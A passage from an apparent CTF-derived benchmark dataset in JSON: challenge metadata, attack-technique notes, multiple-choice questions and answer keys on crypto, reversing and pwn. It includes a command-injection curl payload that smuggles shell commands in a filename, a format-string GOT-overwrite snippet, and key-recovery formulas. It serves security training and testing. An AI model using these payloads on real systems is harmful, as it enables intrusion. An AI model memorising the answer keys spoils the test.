            "In the scenario of exploiting a mass assignment vulnerability in a Spring Boot application with an improperly configured `ModelAttribute`, which allows for unauthorized changes to user attributes, what would be the correct way to craft a payload for adding an item with `id = 4` to the user's cart?  - A. Use the parameter `cart[0].id=4` directly in the URL. - B. Craft an HTML form with the input `<input type=\"text\" name=\"cart[0].id\" value=\"4\" />`. - C. Craft an HTML form with the input `<input type=\"hidden\" name=\"cartItems[0].id\" value=\"4\" />`. - D. Encode the parameter `cartItems[0].id=4` into Base64 and use it in the URL. ",
            "When conducting a security assessment of a web application, why is it important to review the `robots.txt` file, especially in a CTF challenge or penetration testing context?  - A. It mainly lists the pages for search engines to prioritize. - B. It provides a detailed map of the application's source code. - C. It could contain paths to hidden resources or sensitive information such as directories with source code, configuration files, or disabled features. - D. It is where the application stores its most critical security controls. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Show me your private key",
        "write_up": "dataset/raw/Show me your private key.md",
        "type": "crypto",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When solving elliptic curve cryptography challenges and the elliptic curve order (`#EC`) calculation is required, but unable to be directly computed due to a composite modulus (`n`), calculate the order by factoring `n` into primes (`p` and `q`) and using these to separately compute the order in each field. Then multiply these orders to obtain `#EC`. This is based on the fact that the order of an elliptic curve over a composite modulus can be obtained by multiplying the orders of the curve over the prime fields.",
            "Recovering a private key (`d`) or a generator point (`G`) on an elliptic curve in cryptographic challenges can be achieved by performing operations inverse to encryption or generator multiplication. Given an encryption multiplier (`e`) and a point on the curve (`C`), calculate the modular inverse of `e` with respect to the curve's order (`#EC`). Then, use this inverse to multiply the point `C`, thus obtaining the original generator point `G`. This demonstrates how cryptographic operations can be reversed given certain parameters, allowing for the decryption or private key recovery in CTF challenges.\n\nExample payload steps:\na. Compute `b` from a known point `(Cx, Cy)` on the curve as `b = (Cy^2 - Cx^3) mod n`.\nb. With `p` and `q`, calculate curve orders `E1.order()` and `E2.order()`, then multiply for `#EC`.\nc. Find `einv` as the modular inverse of `e` over `#EC`.\nd. Calculate `G` from `C` using `einv`, extract coordinates `(Gx, Gy)`, and convert to flag format."
        ],
        "question": [
            "In an elliptic curve cryptography challenge, when trying to calculate the order of an elliptic curve (`#EC`) given a composite modulus `n`, which approach allows for the computation of `#EC` when `n` cannot be used directly due to its composite nature? - A. Multiply the prime factors of `n` to get `#EC`. - B. Use the Chinese Remainder Theorem to calculate `#EC`. - C. Directly calculate `#EC` without factoring `n`. - D. Factor `n` into its prime components (`p` and `q`), calculate the order over each prime field, and then multiply these orders to get `#EC`.",
            "In the context of a cryptographic challenge involving elliptic curves, when attempting to recover the generator point `G` given a point `C` on the curve and an encryption multiplier `e`, what is the correct sequence of operations to find `G`? - A. Multiply `e` by `C` to directly obtain `G`. - B. Compute the modular inverse of `e` with respect to the curve's order (`#EC`), then multiply `C` by this inverse to get `G`. - C. Add `e` to `C` until reaching the point `G`. - D. Divide `C` by `e` using standard division to find `G`."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Shreddinger",
        "write_up": "dataset/raw/Shreddinger.md",
        "type": "The type of this CTF challenge is: forensics",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 500,
        "max_score": 600,
        "difficulty": 0.8333333333333334,
        "knowledge": [
            "In challenges involving the reconstruction of a shredded document or image, simulated annealing can be an effective approach. This should start with a random arrangement of the shredded pieces, attempt swaps or rotations to explore new configurations, and evaluate these using a scoring function based on pixel differences at the seams. This process will iteratively refine the configuration towards the correct arrangement. Occasional mutations can help escape local minima. This technique is especially useful when direct reconstruction algorithms fail due to the complexity of the document's layout or the need for speed in reassembly.",
            "For image-based challenges where OCR (Optical Character Recognition) is required, and standard tools fail due to unique font styles or distorted text, creating a custom OCR solution may be necessary. This involves manually creating font images for each character and writing a script to match these against the text in the image. This tailored approach allows for accurate text extraction from images where conventional OCR tools like Tesseract are ineffective. Such a method is beneficial when dealing with non-standard fonts, distorted or stylized text that common OCR software cannot accurately interpret."
        ],
        "question": [
            "In an image reconstruction challenge requiring the arrangement of shredded pieces into the original image, which of the following methods best describes the use of simulated annealing for this purpose? - A. Start with the image fully assembled, then gradually disassemble it to determine the original configuration. - B. Begin with a random permutation of pieces, test configurations by swapping two pieces or rotating a subsequence, and use a scoring function based on pixel differences at seams to determine improvements. - C. Arrange pieces in a linear sequence without any swaps or rotations, relying solely on visual inspection to place pieces. - D. Use a genetic algorithm to evolve the arrangement of pieces without testing swaps or evaluating configurations for improvements.",
            "When encountering a challenge that involves optical character recognition (OCR) in an image with a unique font, making conventional OCR tools ineffective, which strategy is most appropriate to accurately extract the text? - A. Use a standard OCR tool like Tesseract without any customization or preprocessing. - B. Increase the resolution of the image in hopes that standard OCR tools become more effective. - C. Manually create font images for each character and write a script to match these against the text in the image, essentially building a custom OCR solution. - D. Convert the image to black and white to simplify the OCR process for standard tools."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "sidhe",
        "write_up": "dataset/raw/sidhe.md",
        "type": "crypto",
        "competition": [
            "PlaidCTF/2020",
            "https://ctftime.org/event/936/tasks/"
        ],
        "score": 300,
        "max_score": 550,
        "difficulty": 0.5454545454545454,
        "knowledge": [
            "In cryptographic challenges involving supersingular isogeny key exchange protocols, exploiting the single selection of a private secret that remains constant across multiple key exchanges can lead to private key recovery. This can be done by slightly altering the public keys for each exchange and observing the effect on the derived shared secrets. If altering a component of the public key (for example, flipping the least significant bit of a parameter) changes the derived shared secret, it indicates that the corresponding bit in the private secret is a '1'; if it does not change, the bit is a '0'. This method allows for bit-by-bit recovery of the private secret through repeated interactions with the server.",
            "For cryptographic algorithms involving operations over elliptic curves and isogenies, when looking to exploit vulnerabilities for key recovery, it is essential to adapt mathematical operations based on the specific group actions (e.g., using 2^e or 3^e operations). Including scaling factors and ensuring operations pass necessary conditions (such as Weil Pairing checks) enables recovery of private key coefficients one at a time. This approach typically involves constructing certain relations that depend on guessing bits or coefficients of the secret and observing whether the protocol interactions remain consistent with those guesses. When direct recovery methods fail due to protocol constraints (e.g., highest coefficients in a polynomial representation of a key cannot be determined), a brute-force search over the remaining possibilities coupled with oracle access (sending crafted messages and observing responses) can be used to find the complete secret key."
        ],
        "question": [
            "When attacking a supersingular isogeny key exchange protocol by manipulating the public key parameters to recover the private secret, which of the following conditions is used to determine the value of a bit in the private secret? - A. Changing the most significant bit of a parameter in the public key to observe changes in the communication protocol handshake. - B. Altering a public key parameter and if the derived shared secret remains the same, it indicates the corresponding bit in the private secret is a '1'; otherwise, it is a '0'. - C. Flipping the least significant bit of a parameter in the public key and if the derived shared secret changes, it indicates the corresponding bit in the private secret is a '1'; if not, the bit is a '0'. - D. Observing changes in the encryption algorithm's output when alternating between using 2^e and 3^e operations in the public key generation. ",
            "In the context of recovering private key coefficients for cryptographic algorithms involving elliptic curves and isogenies, which strategy is crucial for passing the Weil Pairing checks and ensuring the recovery process adheres to the specific group actions of the protocol? - A. Increasing the complexity of the cryptographic hash function used to secure the key exchange process. - B. Implementing a differential cryptanalysis attack to exploit linear relationships between public and private keys. - C. Adapting mathematical operations such as including a scaling factor theta and ensuring that adjusted public keys pass necessary protocol conditions. - D. Utilizing quantum computers to perform calculations that classical computers cannot feasibly execute. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Sign Me Up 797",
        "write_up": "dataset/raw/Sign Me Up 797.md",
        "type": "crypto",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When encountering RSA encrypted messages where each character is encrypted individually, one effective approach is to iterate through all possible ASCII values, encrypt each using the RSA formula `(char_value ** e) % N`, and map these encrypted values to their corresponding characters. This mapping can then be used to decode the ciphertext by matching each encrypted number with its corresponding character. This method relies on the assumption that the plaintext is composed of ASCII characters, which is common in CTF challenges for encoding readable text. \n\n    Sample Python snippet for creating the decryption mapping:\n    ```python\n    N = 20312493432722984634615913227523125265781662152013094377607630781356105942700273581600613724248110835803158659086732527322062709047441686884292861771528866639670389435647460159612029672461252955594829829663172687201461554413049025271464412190235617740846789840419025423396967519520427432799227162339126087426790939948330768088600429869826069490486741417370162186831426441346576810446894902659826134877586519596679449287778809427232767231366708775004671368581690484301650399106765403344734339945464967775820750215294237822308697430395972800155973323880641007064174229976873404987801414040860359400339131120435868680687\n    e = 65537\n\n    dic = {}\n    for i in range(33, 300):  # Basic ASCII range (extended to include special characters just in case)\n        encrypted_char = pow(i, e, N)  # Efficient power mod function\n        dic[encrypted_char] = chr(i)\n    ```",
            "For decryption of the ciphertext when it's known that each character is individually encrypted, one can parse the ciphertext into individual encrypted numbers, use the previously created decryption mapping to find each character, and construct the plaintext message. This technique bypasses the need for factorizing the RSA modulo or obtaining the private key, enabling decryption with only the public key details and the assumption about individual character encryption.\n\n    Sample Python snippet for decrypting the message:\n    ```python\n    # Assuming 'dic' is the dictionary from the encryption step containing the encrypted_char to char mapping\n    # Assuming 'list_char' is a list of the individually encrypted character numbers from the ciphertext\n\n    ans = ''\n    for encrypted_char in list_char:\n        if int(encrypted_char) in dic:  # Check if the encrypted number is in our mapping\n            ans += dic[int(encrypted_char)]  # Look up the character in our dictionary and append to the answer\n        else:\n            ans += '?'  # Placeholder for characters not found (useful for debugging)\n    print(ans)\n    ```\n    This method showcases the adaptability and the quick decryption capabilities in scenarios with simple encryption schemes, an understanding of the encryption method used, and when direct decryption keys or methods are not feasible or available."
        ],
        "question": [
            "Which Python function is the most efficient for performing modular exponentiation, especially useful in decrypting RSA encrypted messages where each character is encrypted individually? - A. `(base ** exponent) % modulus` - B. `mod(base ** exponent, modulus)` - C. `pow(base, exponent, modulus)` - D. `exponentiation(base, exponent) % modulus` ",
            "When decrypting a message where each character is encrypted individually with RSA and given a list of encrypted character numbers, what is the correct method to reconstruct the original message using a pre-built decryption mapping? - A. Concatenate the ASCII value of each encrypted number after finding its match in the decryption mapping. - B. Use the encrypted number as a key to find its corresponding character in the decryption mapping and append it to the decrypted message. - C. Convert each encrypted number to binary, use the decryption mapping to find each character, and then concatenate. - D. Sum all encrypted numbers, find the corresponding character in the decryption mapping once, and repeat it for the length of the encrypted numbers list. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "sign",
        "write_up": "dataset/raw/sign.md",
        "type": "misc",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When dealing with executable binaries in CTF challenges that do not easily give up their secrets through simple methods such as the `strings` command, further analysis using tools like radare2 can reveal hidden or obfuscated content. After loading the binary into radare2 and issuing the `aaa` command to analyze all referenced symbols and functions, followed by `afl` to list the functions, targeted examination of suspicious functions (such as `WinMain` in Windows binaries) can uncover hardcoded secrets, flags, or clues for further exploration. \n\n   Example investigative workflow:  \n   1. Open binary in radare2: `r2 binary_name`  \n   2. Analyze all: `aaa`  \n   3. List functions: `afl`  \n   4. Print function details: `pdf @ sym.function_name`",
            "In CTF challenges that involve binaries compiled for Windows, it is important to consider character encoding differences, such as UTF-16LE commonly used in Windows environments. This might render usual text scanning tools like `strings` ineffective for finding plaintext secrets directly within the binary. Instead, using binary analysis tools that can interpret or display strings in a variety of encodings will help in uncovering hidden flags or data. In scenarios where `strings` fails to find the flag, consider searching the binary for Unicode or UTF-16LE encoded strings manually or with a tool that supports such features.\n\n   Example command for strings with encoding consideration:  \n   `strings -e l binary_name`  (where `-e l` specifies little-endian UTF-16 encoding)"
        ],
        "question": [
            "When analyzing an executable binary from a CTF challenge with radare2 after conventional methods failed to reveal secrets, you have loaded the binary and are ready for further analysis. What would be the next steps to uncover hidden or obfuscated content within this binary? - A. Use `ls` to list directory contents and inspect the binary size. - B. Open the binary in radare2 with `r2 binary_name`, then use `aaa` to analyze all symbols, `afl` to list functions, and `pdf @ sym.function_name` to print details of suspicious functions. - C. Execute the binary with various command-line arguments to trigger potential hidden functionality. - D. Email the challenge organizers for hints regarding the obfuscated content's location.",
            "In a scenario where the `strings` command fails to find plaintext secrets in a Windows compiled binary due to character encoding issues, what alternative method should be considered to uncover hidden flags or data encoded in UTF-16LE? - A. Use `cat` to display the binary content directly in the terminal and manually decode UTF-16LE. - B. Run the binary in multiple environments until the encoded string is automatically decoded. - C. Utilize `hexdump` to manually search for hexadecimal patterns that represent the flag in UTF-16LE. - D. Employ `strings -e l binary_name` to search the binary for little-endian UTF-16 encoded strings, which might reveal hidden data."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Signal of Hope",
        "write_up": "dataset/raw/Signal of Hope.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 120,
        "max_score": 300,
        "difficulty": 0.4,
        "knowledge": [
            "When debugging CTF challenges involving signals, particularly with gdb, changing specific signal behaviors (e.g., Trace trap from SIGTRAP to another signal like SIGTERM) can be crucial for effective debugging. This allows bypassing certain restrictions or behaviors enforced by gdb or the program itself that could hinder analysis. Doing so enables a smoother inspection process. For instance:\n   - Change signal handlers in the code to use less commonly used signals for debugging purposes, like changing `SIGTRAP` (Trace trap) to `SIGTERM` to avoid gdb's special handling of the trace trap.",
            "Using symbolic execution frameworks like Z3 Solver can be highly effective in reversing and solving challenges that involve mathematical or logical operations on unknown values. By modelling the challenge's constraints and requirements as equations or logical expressions, one can automate the discovery of inputs that satisfy those conditions. In challenges where the input is manipulated and checked against specific criteria, translating these operations into constraints and using a solver like Z3 can quickly find valid inputs or secret keys.\n   - Example use of Z3 Solver for reversing:\n     ```python\n     from z3 import *\n     s = Solver()\n     key = [BitVec('key_%d' % i, 8) for i in range(10)]  # Example for 10 characters key\n     # Add constraints based on the challenge's logic here\n     # e.g., s.add(key[0] + key[4] + key[4 + key[4]] == 6)\n     if s.check() == sat:\n         m = s.model()\n         print(''.join(chr(m[k].as_long()) for k in key))\n     ```\n     This Z3 approach transforms the problem-solving process from manual analysis to automated reasoning, expediting the acquisition of the flag in challenges where input needs to meet certain complex criteria."
        ],
        "question": [
            "In a CTF challenge requiring debugging of a program with signals, you noticed that using gdb directly interferes with the program's trace trap signal (SIGTRAP), making debugging difficult. To work around this issue, you consider changing the signal the program uses from SIGTRAP to another signal to avoid gdb's special handling. Which signal could be an appropriate choice for this purpose? - A. SIGKILL - B. SIGSTOP - C. SIGTERM - D. SIGUSR1",
            "When solving a CTF challenge that involves determining the correct input based on complex mathematical constraints, you decide to use the Z3 Solver, a symbolic execution framework, to automate finding valid inputs. Given a scenario where the correct input needs to satisfy several linked mathematical conditions derived from reversing the challenge's logic, which approach best illustrates how you would use Z3 Solver in this context? - A. Manually calculate each possible input value and verify it against the conditions. - B. Implement a brute-force search for all possible input combinations within the given constraints. - C. Model the problem's constraints and operations as logical expressions or equations using Z3's API, then let Z3 find inputs that satisfy all conditions. - D. Use Z3 to generate random input values until one of them accidentally satisfies all the challenge's conditions."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Signature Server",
        "write_up": "dataset/raw/Signature Server.md",
        "type": "crypto",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 148,
        "max_score": 500,
        "difficulty": 0.296,
        "knowledge": [
            "In scenarios involving the application of cryptographic signatures, if message modification checks occur before message padding or normalization, it is possible to bypass these checks by crafting a payload that passes the checks and then relies on the application to transform it into a form identical to the disallowed content. Specifically, submitting a truncated version of a command that is padded on the server side to form a disallowed command can effectively bypass restrictions on signing certain commands. This technique works effectively when server-side logic pads the message to a specific length, inadvertently converting it into a restricted command, thus enabling unintended signature generation.",
            "When dealing with cryptographic challenges that involve checksum and signature generation where the checksum length is notably short, brute-force techniques can be applied to forge the checksum portion of a payload if the checksum algorithm produces a small number of bytes. Specifically, in cases where the checksum is a small part of a larger signature scheme and some parts of the checksum (like the last few bytes) are fixed or predictable, reducing the brute-force effort to only the variable part of the checksum can make it feasible to find a checksum collision. This approach works well when the number of brute-forcing attempts needed is within a practical limit, such as 2^16 attempts for a 2-byte checksum with a fixed ending."
        ],
        "question": [
            "In a cryptographic system where commands are signed and verified before execution, a programmer has implemented a function to prevent certain commands from being signed by checking if they match restricted commands. The application adds padding to commands before signing, but the checks for restricted commands are done before this padding. Given that the `show_flag` command becomes disallowed after padding with `\\xff` to reach a specific length, how can an attacker bypass this restriction to sign the `show_flag` command?  - A. By sending the `show_flag` command without any padding, relying on server-side padding to bypass the check. - B. By encrypting the `show_flag` command before sending, ensuring it is not recognized by the check. - C. By padding the command with `\\x00` before sending, to match the server-side expected padding. - D. By including characters that are filtered out by the server before the command is checked, altering its appearance but not its functionality. ",
            "In an environment where a server performs operations based on the signatures of commands it receives, the server uses a checksum as part of its signature verification process. Due to constraints, the checksum is only 4 bytes long, but with insights that the last two bytes are always `\\x00\\x00`, effectively reducing the checksum's complexity. Given these conditions, which strategy can be employed to brute-force the checksum for a command that is normally not allowed to be signed directly (like changing user to admin)?  - A. Brute forcing the entire 4-byte checksum with a complexity of 2^32. - B. Brute forcing the first two bytes of the checksum, considering the last two bytes are fixed (\\x00\\x00), with a practical complexity of 2^16. - C. Encrypting the command to alter its checksum predictably, bypassing the need for brute forcing. - D. Using a complex machine learning algorithm to predict the checksum values without brute-force attempts. "
        ],
        "answer": [
            "A.",
            "B."
        ]
    },
    {
        "name": "Signed Flag",
        "write_up": "dataset/raw/Signed Flag.md",
        "type": "crypto",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 492,
        "max_score": 500,
        "difficulty": 0.984,
        "knowledge": [
            "In a scenario involving the analysis of DSA (Digital Signature Algorithm) vulnerabilities, specifically when the same nonce (`k`) is reused across different signatures, it is possible to recover the nonce and subsequently, the private key (`d` or `x`), from known messages and their signatures. This can be done by calculating the difference between two message hashes and their signature `s` values, and then applying modular inverse operations. Given `q` (the prime divisor of `p-1`), `r` (part of the signature), two message hashes (`hm1`, `hm2`), and their corresponding `s` values (`s1`, `s2`), one can compute `k` as follows:\n   - First, calculate the difference of `s` values (`ds = s2 - s1`) and the difference of message hashes (`dm = hm2 - hm1`).\n   - Compute `k = (inverse(ds, q) * dm) % q`.",
            "Knowing `k`, the private key `x` can be recovered from a single signature (`s`, `r`) and the hash of a signed message (`hm`). This is critical for scenarios where an attacker intercepts or can calculate the hash of a known message and its signature. The formula to compute the private key `x` is:\n   - `x = ((s*k - hm) * inverse(r, q)) % q`.\n   \nThese methods are particularly effective in cryptanalysis and cybersecurity practices for identifying and exploiting vulnerabilities in digital signature schemes, where nonce reuse or poorly secured key handling practices are present."
        ],
        "question": [
            "In the context of exploiting vulnerabilities in the Digital Signature Algorithm (DSA) due to the reuse of a nonce (`k`), which expression correctly outlines the calculation of `k` from two message-signature pairs? Assume you have the differences between their signature `s` values (`ds = s2 - s1`), the differences between their hashed messages (`dm = hm2 - hm1`), and `q`, the prime divisor of `p-1`. - A. `k = (dm * inverse(ds, q)) % p` - B. `k = (ds * dm) % q` - C. `k = (ds * inverse(dm, q)) % p` - D. `k = (inverse(ds, q) * dm) % q` ",
            "Given the recovered nonce (`k`) from a pair of DSA signatures and the difference of the hashes of the messages signed (`hm1`, `hm2`), along with one of the signatures (`s`, `r`), which formula correctly represents the recovery of the private key (`x`) involved in the signatures? Here, `q` is the prime divisor of `p-1`, and `hm` is the hash of a known message that was signed. - A. `x = ((s - k * hm) / r) % q` - B. `x = ((s + k - hm) * r) % q` - C. `x = ((s*k - hm) * inverse(r, q)) % q` - D. `x = (k * (s - hm) / inverse(r, q)) % p` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Silhouettes",
        "write_up": "dataset/raw/Silhouettes.md",
        "type": "pwn",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When encountering a web service that accepts file uploads, assess the security of the file handling practices, particularly how the service processes and interprets the file names and content. If the service uses external libraries or tools (e.g., ImageIO, `dcmdjpeg.exe`) to process uploaded files, investigate those tools for known vulnerabilities or insecure practices, such as using `subprocess` with `shell=True` in Python, which can lead to remote code execution if user input is not properly sanitized. This vulnerability can often be exploited by crafting file names that inject shell commands or by uploading specially crafted files designed to trigger insecure behavior in the processing libraries.",
            "In scenarios where the application combines user input with system commands or file paths, ensure to check all input sanitization mechanisms (e.g., PHP's `basename()` or `escapeshellarg()`, Python's `subprocess.list2cmdline()`, Windows filesystem restrictions) to identify any potential bypasses. Characters like spaces, tabs, commas, semicolons, and equal signs might be interpreted differently by various processors (e.g., `cmd.exe`), allowing argument injection even with restrictions in place. This knowledge can be exploited by structuring commands or file names in a way that bypasses input filtering and leads to unintended command execution. An example could be crafting a payload that utilizes known filename sanitization bypasses to execute arbitrary commands or access restricted directories.\n\n   Example payload for bypassing space restrictions and accessing higher directory levels in a command injection vulnerability: `curl -F 'file=@/path/to/dicom_jpeg;filename=x&cd..&cd..&dir&x' 'http://vulnerable.site/upload'`"
        ],
        "question": [
            "When analyzing the security of a web service that saves uploaded files using the original file names provided by users, why is it critical to scrutinize the external libraries or commands it invokes for processing these files? In the context of a service using ImageIO and `dcmdjpeg.exe` for handling DICOM files, consider the potential risks of executing system commands with user-controlled input.  - A. Because uploading files with original names can cause storage conflicts and overwrite important files. - B. Because user-provided file names might not be compatible with the external tools, leading to performance degradation. - C. Because it might lead to unauthorized access or leakage of sensitive information if directory traversal attacks are attempted through file names. - D. Because the service's reliance on external tools with unsafe practices, such as using `subprocess` with `shell=True` without proper input sanitization, can be exploited to execute arbitrary code remotely. ",
            "Given a web application that concatenates user input with file paths for command execution, which of the following characters could potentially bypass input sanitization mechanisms and lead to argument injection, assuming the environment is Windows-based and leverages `cmd.exe` for command execution?  - A. Forward slashes (`/`) and backslashes (`\\`) for directory traversal. - B. Letters (`a`-`z`, `A`-`Z`) and digits (`0`-`9`) for file names. - C. Commas (`,`), semicolons (`;`), and equal signs (`=`) as command argument separators. - D. Special characters like `@` and `#` for denoting variables or comments. "
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Silk Road I",
        "write_up": "dataset/raw/Silk Road I.md",
        "type": "pwn",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 83,
        "max_score": 500,
        "difficulty": 0.166,
        "knowledge": [
            "In binary exploitation challenges involving obfuscated constraints and computations from user input, employing a mixed approach of both static and dynamic analysis can lead to a more efficient solution. Here, static analysis (using tools like Ghidra and Binary Ninja) is used initially to understand the constraints and logic of the binary. Dynamic analysis (using custom scripts and patching binaries for instrumentation) can then be applied for experimenting with inputs in a controlled environment. This approach is beneficial when confronting binaries that implement unconventional behavior, such as handling leading zeros in inputs differently. Dynamic analysis, in this case, revealed that leading zeros could cause a divide by zero exception, which might not have been easily discovered through static analysis alone.",
            "When dealing with non-standard execution environments or when library functions fail due to incorrect offsets, direct manipulation of machine code and memory can be a workaround. This involves tasks such as mmap'ing binary code into memory, marking it as executable, and manually patching in jumps to correct library function offsets using placeholder nops or customized jump instructions (`mov rax, address; jmp rax`). Although tedious, this method allows for execution of hand-crafted or extracted binary blobs within a different binary or execution context. This technique proves useful in situations where the standard linking or execution flow of a binary has been altered or is being emulated."
        ],
        "question": [
            "When tackling binary exploitation challenges with obfuscated logic and user inputs, which combination of analysis techniques proved effective in understanding and manipulating the binary's constraints for a more efficient solution? - A. Solely dynamic analysis using tools like GDB and dynamic instrumentation frameworks. - B. Solely static analysis with decompilation tools such as IDA Pro and Ghidra. - C. A blend of static analysis to understand binary logic and dynamic analysis for input experimentation and debugging. - D. Using high-level language emulation without any binary analysis tools. ",
            "In a scenario where standard library functions are inaccessible due to incorrect memory offsets in a manipulated execution environment, what custom technique can be employed to allow execution and correct linking of binary code? - A. Recompile the original source code with static linking to include all necessary libraries. - B. Dynamically type-checking variables at runtime to ensure compatibility with library functions. - C. Direct manipulation of machine code, including `mmap` to mark memory as executable and manual patching of jumps to correct function offsets. - D. Use of a managed runtime environment like the JVM or .NET CLR to automatically handle memory management and linking. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Silk road II",
        "write_up": "dataset/raw/Silk road II.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 171,
        "max_score": 500,
        "difficulty": 0.342,
        "knowledge": [
            "When facing a brute-force challenge where the secret is a numeric string, consider implementing a direct brute-force attack by iterating over possible values, converting them to strings, and testing each against the provided verification function. This approach is particularly effective when the search space is relatively small, allowing the brute-force attack to complete in a reasonable timeframe.",
            "In challenges involving stack overflows and format string vulnerabilities, bypassing protections like stack canaries may be possible by carefully crafting inputs that exploit the function's behavior without altering sensitive memory areas. For instance, providing input that causes a `scanf`-like function to return early without writing to a buffer can maintain the integrity of the canary, enabling a stack overflow without triggering security mechanisms. \n\n    Example payload for bypassing canary protection using an invalid floating point number with `scanf`: Send \"-\" as the input to prevent overwriting the canary, followed by a carefully constructed overflow payload that respects the untouched canary value."
        ],
        "question": [
            "In a CTF brute-force challenge that targets a numerical string secret, a programmer decides to implement a loop that iterates through potential numerical combinations, converts each to a string, and checks it against a verification function. The verification function returns true if the string meets specific criteria indicating that the secret has been discovered. Given this scenario, which C code snippet correctly implements this brute-force approach?  - A. ```c for (int i = 0; i < 10000; i++) { char secret[5]; sprintf(secret, \"%04d\", i); if (verifySecret(secret)) { printf(\"Found: %s\\n\", secret); break; } } ``` - B. ```c for (int i = 0; i < 10000; i++) { if (verifySecret(i)) { printf(\"Found: %d\\n\", i); break; } } ``` - C. ```c char secret[5]; for (int i = 0; i < 10000; i++) { itoa(i, secret, 10); if (verifySecret(secret)) { printf(\"Found: %s\\n\", secret); break; } } ``` - D. ```c int secret = 0; while (!verifySecret(&secret)) { secret++; } printf(\"Found: %d\\n\", secret); ``` ",
            "In a scenario involving a stack overflow vulnerability, a security researcher aims to bypass stack canary protection by exploiting the behavior of a `scanf`-like function. This function, when receiving a certain type of invalid input, returns prematurely without modifying the buffer, including the canary value. Based on this approach, what kind of invalid input would likely achieve the desired effect, thereby maintaining the integrity of the stack canary and allowing the researcher to execute a payload without detection?  - A. Sending a large integer that exceeds the expected range. - B. Providing a string that contains null bytes '\\x00' within its content. - C. Utilizing an input string \"AAAA\" that represents typical buffer overflow. - D. Supplying a character \"-\" as the input to cause `scanf` to return early without writing to the buffer. "
        ],
        "answer": [
            "A",
            "D"
        ]
    },
    {
        "name": "Silk road III",
        "write_up": "dataset/raw/Silk road III.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 182,
        "max_score": 500,
        "difficulty": 0.364,
        "knowledge": [
            "When encountering a situation where a CTF challenge involves cracking a numeric string, consider employing a brute-force approach if the secret is numeric and the search space is not overly large. This is viable when the constraint within the challenge logic reduces the possible range of values significantly, making a brute-force search computationally feasible.",
            "When exploiting a format string vulnerability to achieve arbitrary code execution or leak memory contents, one can use a combination of `%p` for pointer leaks to determine base addresses, and `%n` or variations thereof (like `%hn`, `%hhn`) for writing arbitrary values to memory by controlling the format string input. The exploit development process involves identifying writable addresses (e.g., GOT entries), calculating desired values to overwrite these addresses with (e.g., `system()` address), and crafting payloads that use the format string vulnerability to make these overwrites. This approach can be demonstrated in scenarios where error messages containing user-controlled input are printed without proper sanitization.\n   \n   Example payload using format string to overwrite GOT entry:\n   ```\n   payload = fmtstr_payload(offset, {got_puts: libc_system}, write_size='short')\n   ```\n   This hypothetical payload would use an automated tool like Python's `fmtstr_payload` from the `pwntools` library to generate a format string that writes the address of `libc_system` into the Global Offset Table (GOT) entry of `puts`, effectively redirecting calls to `puts` to `system`. The `offset` parameter signifies the position in the format string where the written value starts, and `{got_puts: libc_system}` is a dictionary mapping the target memory address (`got_puts`) to the value to write there (`libc_system`). The `write_size='short'` argument specifies that each write operation should use two bytes at a time, suitable for `%hn`."
        ],
        "question": [
            "In a challenge context requiring brute-force to crack a numeric string ID, if the code snippet uses the following approach for verification: ```c bool sub_40140A(char *secret) { sint = strtol(secret, 0LL, 10); if ( sint % (strlen(secret) + 2) || secret[4] != '1' ) return 0; ... return ret; } ``` How should you approach cracking the secret numeric string efficiently? - A. Use a dictionary attack with common passwords - B. Employ a brute-force attack considering the secret is a numeric string and constraints reduce potential combinations - C. Manually guess the secret ID based on potential patterns - D. Reverse-engineer the software to eliminate the need for the secret ID",
            "Given you have identified a format string vulnerability in an application that generates error messages including user-controlled input without sanitization, which of the following options correctly shows how you could exploit this vulnerability to leak memory contents and potentially allow for arbitrary code execution? - A. Inject SQL commands to interfere with database operations - B. Encapsulate malicious JavaScript code to execute on the webpage - C. Use `%p` to leak pointer addresses and `%hn` to write arbitrary values to memory addresses, carefully crafting the payload to overwrite critical entries like GOT - D. Utilize buffer overflow to execute arbitrary code directly without using format strings"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Simple SPN",
        "write_up": "dataset/raw/Simple SPN.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 766,
        "max_score": 906,
        "difficulty": 0.8454746136865342,
        "knowledge": [
